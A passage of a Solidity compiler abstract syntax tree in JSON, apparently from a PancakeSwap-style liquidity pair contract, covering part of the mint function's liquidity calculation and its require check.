															"id": 909,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5287:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 904,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 477,
																	"src": "5269:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 903,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1784,
																"src": "5262:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 905,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5262:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$1784",
																"typeString": "contract IERC20"
															}
														},
														"id": 906,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1745,
														"src": "5262:24:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 910,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5262:39:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5246:55:1"
											},
											{
												"assignments": [
													913
												],
												"declarations": [
													{
														"constant": false,
														"id": 913,
														"name": "amount0",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5311:12:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 912,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5311:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 918,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 916,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 884,
															"src": "5339:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 914,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 891,
															"src": "5326:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 915,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2357,
														"src": "5326:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 917,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5326:23:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5311:38:1"
											},
											{
												"assignments": [
													920
												],
												"declarations": [
													{
														"constant": false,
														"id": 920,
														"name": "amount1",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5359:12:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 919,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5359:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 925,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 923,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 886,
															"src": "5387:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 921,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 902,
															"src": "5374:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 922,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2357,
														"src": "5374:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 924,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5374:23:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5359:38:1"
											},
											{
												"assignments": [
													927
												],
												"declarations": [
													{
														"constant": false,
														"id": 927,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5408:10:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 926,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "5408:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 932,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 929,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 884,
															"src": "5430:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 930,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 886,
															"src": "5441:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 928,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 874,
														"src": "5421:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 931,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5421:30:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5408:43:1"
											},
											{
												"assignments": [
													934
												],
												"declarations": [
													{
														"constant": false,
														"id": 934,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5461:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 933,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5461:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 936,
												"initialValue": {
													"argumentTypes": null,
													"id": 935,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "5481:11:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5461:31:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 939,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 937,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 934,
														"src": "5584:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 938,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5600:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "5584:17:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 979,
													"nodeType": "Block",
													"src": "5805:169:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 977,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 961,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 881,
																	"src": "5819:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 969,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 966,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 934,
																						"src": "5869:12:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 964,
																						"name": "amount0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 913,
																						"src": "5857:7:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 965,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2385,
																					"src": "5857:11:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 967,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "5857:25:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 968,
																				"name": "_reserve0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 884,
																				"src": "5885:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "5857:37:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 975,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 972,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 934,
																						"src": "5924:12:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 970,
																						"name": "amount1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 920,
																						"src": "5912:7:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 971,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2385,
																					"src": "5912:11:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 973,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "5912:25:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 974,
																				"name": "_reserve1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 886,
																				"src": "5940:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "5912:37:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 962,
																			"name": "Math",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2311,
																			"src": "5831:4:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_Math_$2311_$",
																				"typeString": "type(library Math)"
																			}
																		},
																		"id": 963,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "min",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2256,
																		"src": "5831:8:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 976,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "5831:132:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5819:144:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 978,
															"nodeType": "ExpressionStatement",
															"src": "5819:144:1"
														}
													]
												},
												"id": 980,
												"nodeType": "IfStatement",
												"src": "5580:394:1",
												"trueBody": {
													"id": 960,
													"nodeType": "Block",
													"src": "5603:196:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 951,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 940,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 881,
																	"src": "5617:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 949,
																			"name": "MINIMUM_LIQUIDITY",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 462,
																			"src": "5665:17:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 945,
																							"name": "amount1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 920,
																							"src": "5651:7:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"id": 943,
																							"name": "amount0",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 913,
																							"src": "5639:7:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 944,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2385,
																						"src": "5639:11:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 946,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "5639:20:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 941,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2311,
																					"src": "5629:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$2311_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 942,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2310,
																				"src": "5629:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 947,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "5629:31:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 948,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2357,
																		"src": "5629:35:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 950,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "5629:54:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5617:66:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 952,
															"nodeType": "ExpressionStatement",
															"src": "5617:66:1"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 955,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "5711:1:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				}
																			],
																			"id": 954,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "5703:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 956,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "5703:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 957,
																		"name": "MINIMUM_LIQUIDITY",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 462,
																		"src": "5715:17:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 953,
																	"name": "_mint",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 125,
																	"src": "5697:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,uint256)"
																	}
																},
																"id": 958,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "5697:36:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 959,
															"nodeType": "ExpressionStatement",
															"src": "5697:36:1"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 984,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 982,
																"name": "liquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 881,
																"src": "5991:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 983,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6003:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "5991:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
															"id": 985,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6006:40:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY_MINTED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\""
															}
														],
														"id": 981,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "5983:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 986,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5983:64:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 987,
												"nodeType": "ExpressionStatement",
												"src": "5983:64:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 989,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 876,
															"src": "6063:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 990,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 881,
															"src": "6067:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 988,
														"name": "_mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 125,
														"src": "6057:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256)"
														}
													},
													"id": 991,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6057:20:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 992,
												"nodeType": "ExpressionStatement",
												"src": "6057:20:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 994,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 891,
															"src": "6096:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 995,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 902,
															"src": "6106:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
